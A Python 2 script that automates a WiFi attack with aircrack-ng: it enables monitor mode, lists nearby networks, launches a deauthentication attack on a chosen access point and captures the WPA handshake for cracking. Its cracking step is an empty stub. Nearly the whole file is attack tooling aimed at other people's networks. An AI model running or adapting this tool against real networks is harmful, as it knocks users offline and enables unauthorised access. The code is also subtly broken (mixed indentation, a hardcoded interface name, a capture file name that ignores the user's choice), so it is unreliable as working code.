import os, time, sys, fileinput, subprocess, shlex, os.path, csv

#Setup (updates and installs)
def instal_setup():
	os.system("clear")
	print("Installing everything that is required:")
	time.sleep(2)
	print("Updating...")
	os.system("sudo apt-get update")
        time.sleep(1)
	os.system("clear")
	print("Upgrading...")
        os.system("sudo apt-get upgrade")
	time.sleep(1)
        os.system("clear")
        print("Installing Aircrack-ng...")
        os.system("sudo apt-get install aircrack-ng")
	time.sleep(1)
	print("FINISHED!")
	print("EVERYTHING THAT IS NEEDED IS INSTALLED! HAVE FUN!")
	menu()

#Starts the interface in monitor mode
def start_monitor_mode():
	print("Your network interfaces are...")
	#This line is just to make sure there is no bugs, restarts all the connections to run in a fresh environment
	os.system('service network-manager restart')
	time.sleep(3)
	os.system("airmon-ng")
	time.sleep(.5)
	os.system("airmon-ng check kill")
	time.sleep(1)
	i = raw_input("Enter your network interface: ")
	time.sleep(1)
	command = "airmon-ng start "+i
	os.system(command)
	#Saves the interface name in a file to use multiple times in the script later
	l = open("NODELETE.txt","w")
	l.write(i+"mon")
	l.close()
	time.sleep(1)
	print("DONE!")
	time.sleep(1)
	menu()

def clean_indv():
	#Cleans all the devices info, only shows the networks available
	ignore = False
	for line in fileinput.input('WiFi__List-01.csv', inplace=True):
		if not ignore:
			if line.startswith('Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs'):
			    ignore = True
			else:
			    print line,
		#Only executes if the ignore is set to True, which happens when it finds the line.startswith()
		if ignore and line.isspace():
			ignore = False
	#Cleans first blank line, just because makes it more beautiful
	os.system("sed -i '1d' WiFi__List-01.csv")
	menu()

def networks_arround():
	l = open("NODELETE.txt","r")
	il = l.read()
	time.sleep(.5)
		
	#Check if exists any older file and if yes removes it
	if os.path.exists('WiFi__List-01.csv'):
		os.system("rm WiFi__List-*")
	
	#Command to get the networks arround info		
	command = "airodump-ng -w WiFi__List --output-format csv wlan0mon"
   	
	#Starts a subprocess to kill the airmon-ng command after 5 seconds		
	process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
	time.sleep(1)
	while True:		
		time.sleep(5)			
		process.kill()
		os.system("clear")
		os.system("reset")
		print("WIFI LIST FILE CREATED!")
		break

	time.sleep(1)	
	l.close()
	clean_indv()

#Just to display the saved networks
def display_networks_available():
	#Checks if the file already exists
	if os.path.exists('WiFi__List-01.csv'):
		#Prints a table using the import csv with all the ESSID of the networks discouvered
		print("\n")
		print("=========================================================")
		print("|     		List of Available Networks:	 	|")
		print("=========================================================")
		#Used to print the lines		
		n = 1
		#Opens the csv file in Dictionary mode
		with open('WiFi__List-01.csv') as csvfile:
			reader = csv.DictReader(csvfile)
			for row in reader:									
				print("|   "+str(n)+"	|	"+row[' ESSID']+" ")
				n+=1
		print("==========================================================")
		menu()
	else:
		print("THERE IS NO WIFI LIST CREATED..\n")		
		print("CREATING A NEW WIFI LIST OF THE AVAILABLE NETWORKS ARROUND\n")
		time.sleep(1)
		networks_arround()

#This function is similar to the display_networks_available, however do not redirect to the menu()	
def display_handshake():
	#Checks if the file already exists
	if os.path.exists('WiFi__List-01.csv'):
		#Prints a table using the import csv with all the ESSID of the networks discouvered
		print("\n")
		print("=========================================================")
		print("|		List of Available Networks:	 	|")
		print("=========================================================")
		#Used to print the lines		
		n = 1
		#Opens the csv file in Dictionary mode
		with open('WiFi__List-01.csv') as csvfile:
			reader = csv.DictReader(csvfile)
			for row in reader:									
				print("|   "+str(n)+"	|	"+row[' ESSID']+" ")
				n+=1
		print("=========================================================")
		
	else:
		print("THERE IS NO WIFI LIST CREATED..\n")		
		print("CREATING A NEW WIFI LIST OF THE AVAILABLE NETWORKS ARROUND\n")
		time.sleep(1)
		networks_arround()
	

def capture_handshake():
	
	display_handshake()
		
	try:
		network = raw_input("Input the number of the Network you want to try a Handshake: ")
		
		#Count how many networks exists
		file_name= "WiFi__List-01.csv"
		count = 0
		with open(file_name, 'r') as f:
			for line in f:
				count += 1

		#Next line is because the networks file is always created with the first line (info) and a blank line in the end
		count = count - 2
		
		#Checks if the number typed by the user is correct (inside the range of networks available)
		if 1 <= int(network) < (count+1):
	
			l = open("NODELETE.txt","r")
			il = l.read()
			time.sleep(.5)
		
			f = raw_input("Name of the file that will be generated by airodump-ng: ")
			
			dea = raw_input("How many times do you want to deauthenticate the users: ")

			#Opens the WiFi list file and creates an object/array for later be used
			fil = open("WiFi__List-01.csv")
			csv_f = list(csv.reader(fil))
			
			#Assigns the correct network to get the MAC and Channel values later
			position = (int(network))
		
			#Gets the values of the MAC Address and the Channel from the file
			bs = csv_f[position][0]
			c = csv_f[position][3]
			
			#CREATES THE DEAUTH FILE - Later is called to execute in a separate terminal
			deauth_net = "aireplay-ng --deauth "+dea+" -a "+bs+" "+il
			a = "import os\n"
			s = open("deauth.py","w")
			s.write(a)
			s.write("os.system('"+deauth_net+"')")
			s.close()
	
			#HANDSHAKE

			#Handshake Try Command
			command = "airodump-ng -w "+f+" --bssid "+bs+" -c "+c+" --write-interval 1 "+il
			
			#Test Command
			#command = "airodump-ng -w WiFi__List --output-format csv --write-interval 1 wlan0mon" 
			
			#Closes the NODELETE.txt file 
			l.close()
		    	
			#Open a different terminal windows and run the deauth.py to start deauthenticate the network.
			os.system("gnome-terminal -- bash -c 'python deauth.py; exec bash'")

			#Execute the airodump command and send the name of the file created with it (f)
			run_subcommand(command, f)

		else:
		    print("Please input a possible option.")
		    time.sleep(1)
		    capture_handshake()

	except IndexError:
		print("What have you done? Restarting... :)")
		time.sleep(1)
		capture_handshake()   

	#Awk examples for the WiFi_List file
	#Name of the Network and remove comma in the end
	#awk 'NR == 2 {print substr($19, 1, length($19)-1)}' WiFi__List-01.csv

	#awk command to get the $n string in the n line that is separated by the ","
	#awk -F "," 'NR == 5 {print $14}' WiFi__List-01.csv
	
def run_subcommand(command, f):
	#Executes the subprocess with the command sent by the previous function (the airodump-ng command)
	process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
	time.sleep(1)
	#Will keep the subprocess running until the process.kill is found
	while True:
		#Use tcpdump function to read the .cap file created and outputs to an external file only the EAPOL packets	
		os.system("tcpdump -r wifi-01.cap ether proto 0x888e > cap.txt &")
		time.sleep(0.1)
		
		#Just check how many lines the new file has
		nlines = len(open("cap.txt").readlines())
		
		#If the number of lines is >= 4 (4 packets of EAPOL needed to get a Handshake) executes the commands
		if nlines >= 4:
			#Kill the subprocess running
			process.kill()
			#Next couple commands are just to make the terminal output clean and not bugged (sometimes the terminal after this stage became bugged and had to reset to get it normal again
			os.system("clear")
			os.system("reset")	
			print("=========================================================")
			print("|		   HANDSHAKE ACHIEVED!			|")
			print("=========================================================")
			print("|On File: "+f+"						|")
			print("=========================================================\n")
			print("Do you want to crack this network?")
			break
	#The while breaks and redirect the user to the cracking function	
	crack_q()

#Simple function to ask the user if he wants to crack the wifi or not            
def crack_q():
	try:
		crack = raw_input("Y/N?: ")
		
		if crack in {"Y", "y"}:
		    crack_wifi()
		if crack in {"N", "n"}:	
		    menu()	
		else:
		    print("Please input a possible option.")
		    time.sleep(1)
		    crack_q()

	except IndexError:
		print("Please input a possible option.")
		time.sleep(1)
		crack_q()            
            

def crack_wifi():
    ##AIRCRACK STUFF
	print("CRACKING TIME!")
    

def menu():

	print("\n")
	print("WIFI HACKING - AUTOMATING SCRIPT\n")
	time.sleep(0.5)
	print("=========================================================")
	print("|		   Available options:			|")
	print("=========================================================")
	print("|   1	|Install all that is required			|")
	print("|   2	|Start your interface in mon(itor) mode		|")
	print("|   3	|See all the networks around you		|")
	print("|   4	|Try Handshake / Deauth and Crack the WiFi	|")
	print("=========================================================")

	try:
		a = raw_input("Type your option: ")

		if a == "1":
			instal_setup()
		elif a == "2":
			start_monitor_mode()	
		elif a == "3":
			display_networks_available()
		elif a == "4":
			capture_handshake()		
		else:
			print("Please input a possible option.")
			time.sleep(1)
			menu()
			
	except IndexError:
		print("Please input a possible option.")
		time.sleep(1)
		menu()

menu()
